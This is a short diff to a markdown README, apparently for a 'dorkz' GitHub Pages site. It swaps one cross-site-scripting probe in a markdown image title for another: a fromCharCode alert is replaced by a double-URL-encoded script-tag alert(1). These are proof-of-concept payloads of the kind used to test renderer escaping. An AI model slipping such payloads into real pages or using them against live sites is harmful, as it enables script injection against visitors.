@@ -1,5 +1,6 @@
 # https://ph-apolonio.github.io/dorkz
 
-this is an ![alt text](https://media.tenor.com/kqixRX0zKOcAAAAd/cool.gif "alert(String.fromCharCode(88,83,83))//")
+this is an ![alt text](https://0e.vc/ "%253cscript%253ealert(1)%253c/script%253e
+")
 
 
